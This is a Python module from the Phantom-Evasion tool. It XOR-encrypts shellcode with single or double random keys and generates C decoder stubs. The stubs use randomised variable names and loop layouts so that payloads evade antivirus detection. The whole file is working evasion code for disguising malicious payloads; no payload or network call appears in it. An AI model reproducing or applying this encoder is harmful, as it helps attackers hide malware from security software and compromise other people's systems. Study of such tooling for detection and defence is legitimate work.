
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################
     

import os,sys
import random,string
from time import sleep
from Crypthelper import Printable
from Crypthelper import KeyGen
from Crypthelper import RandVarname
from platform import python_version
     
def Xor(data,key):

    while(len(key)<len(data)):

        key = key*2 

    if python_version()[0] == "2":

        shellcode = ""
        keyarray=bytearray(key)
        data_array=bytearray(data)

        for b in range(0,len(data_array)):
        
            shellcode += bytearray([data_array[b]^keyarray[b]]) 

        return shellcode

    else:

        data=data.decode('unicode-escape').encode('latin-1')
        
        return bytes(x ^ y for x, y in zip(data,key[:len(data)]))


def XorEncrypt(shellcode,bufname,memptr=""):

    key=KeyGen(random.randint(32,128))

    if python_version()[0] == "2":

        e_shell = Xor(shellcode.decode('string-escape'),key)
    else:
        e_shell = Xor(shellcode.encode('latin-1'),key) 
        

    p_shell = Printable(e_shell) 
    p_key = Printable(key)

    Randflag1 = RandVarname()
    Randflag2 = RandVarname()
    keyname = RandVarname()

    Xor_stub = ""

    if "*$#FILE*" in bufname:
        Flag=True
        bufname=bufname.replace("*$#FILE*","")

    Encoded_buffer = p_shell

    bufname = memptr or bufname

    #Encoded_buffer = "unsigned char " + bufname + "[] = {" + printable_shellcode.replace("\\x",",0x")[1:] + "};\n"


    StubSelect = random.randint(1,4)

    if StubSelect == 1:

        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 2:

        Xor_stub += "int " + Randflag1 + "," + Randflag2 + "=0;\n"
        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + ";" + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "] = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"

    if StubSelect == 3:

        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " +=1;}\n"

    if StubSelect == 4:

        Xor_stub += "unsigned char " + keyname + " [] = \"" + p_key + "\";\n"
        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keyname + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname + ")-2){\n"
        Xor_stub += Randflag2 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " +=1;}\n"

    return (Encoded_buffer,Xor_stub)

def DoubleKeyXorEncrypt(shellcode,bufname,memptr=""):

    key1 = KeyGen(random.randint(32,128))
    key2 = KeyGen(random.randint(32,128))

    Realkey = Xor(key1,key2)

    if python_version()[0] == "2":

        e_shell = Xor(shellcode.decode('string-escape'),Realkey)
    else:
        e_shell = Xor(shellcode.encode('latin-1'),Realkey) 

    p_shell = Printable(e_shell)
    p_key1 = Printable(key1)
    p_key2 = Printable(key2)

    Randflag1 = RandVarname()
    Randflag2 = RandVarname()
    Randflag4 = RandVarname()
    keyname1 = RandVarname()
    keyname2 = RandVarname()
    keynamestep1 = RandVarname()
    keynamestep2 = RandVarname()

    Xor_stub = ""

    if "*$#FILE*" in bufname:
        Flag=True
        bufname=bufname.replace("*$#FILE*","")

    Encoded_buffer = p_shell
    
    bufname = memptr or bufname

    StubSelect=random.randint(1,4)

    if StubSelect == 1:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < sizeof(" + keyname1 + ")-1; " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}"  

    if StubSelect == 2:

        Xor_stub += "int " + Randflag1 + ";\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < sizeof(" + keyname1 + ")-1; " + Randflag1 +"++){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;\n}}"
        Xor_stub += "for(" + Randflag1 + "=0; " + Randflag1 + " < " + str(len(e_shell)) + "; " + Randflag1 +"++){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;\n}}" 

    if StubSelect == 3:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Xor_stub += "while(" + Randflag1 + " < sizeof(" + keyname1 + ")-1){\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"   

    if StubSelect == 4:

        Xor_stub += "int " + Randflag1 + " = 0;\n"
        Xor_stub += "int " + Randflag2 + " = 0; int " + Randflag4 + " = 0;\n"
        Xor_stub += "unsigned char " + keyname2 + " [] = \"" + p_key2 + "\";\n"
        Xor_stub += "unsigned char " + keyname1 + " [] = \"" + p_key1 + "\";\n"
        Xor_stub += "unsigned char " + keynamestep1 + " [sizeof(" + keyname1 + ")-1];\n"
        Xor_stub += "while(" + Randflag1 + " < sizeof(" + keyname1 + ")-1){\n"
        Xor_stub += keynamestep1 + "[" + Randflag1 + "]  = " + keyname1 + "[" + Randflag1 + "]^" + keyname2 + "[" + Randflag2 + "];\n"
        Xor_stub += "if(" + Randflag2 + " == sizeof(" + keyname2 + ")-2){\n"
        Xor_stub += Randflag2 + " = 0;\n}"
        Xor_stub += "else{\n"
        Xor_stub += Randflag2  + " = " + Randflag2 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"
        Xor_stub += Randflag1 + " = 0;\n"
        Xor_stub += "while(" + Randflag1 + " < " + str(len(e_shell)) + "){\n"
        Xor_stub += bufname + "[" + Randflag1 + "]  = " + bufname + "[" + Randflag1 + "]^" + keynamestep1 + "[" + Randflag4 + "];\n"
        Xor_stub += "if(" + Randflag4 + " == sizeof(" + keyname1 + ")-2){\n"
        Xor_stub += Randflag4 + " = 0;\n}" 
        Xor_stub += "else{\n"
        Xor_stub += Randflag4  + " = " + Randflag4 + " + 1;}\n"
        Xor_stub += Randflag1 + " += 1;}\n"    
 
    return (Encoded_buffer,Xor_stub)
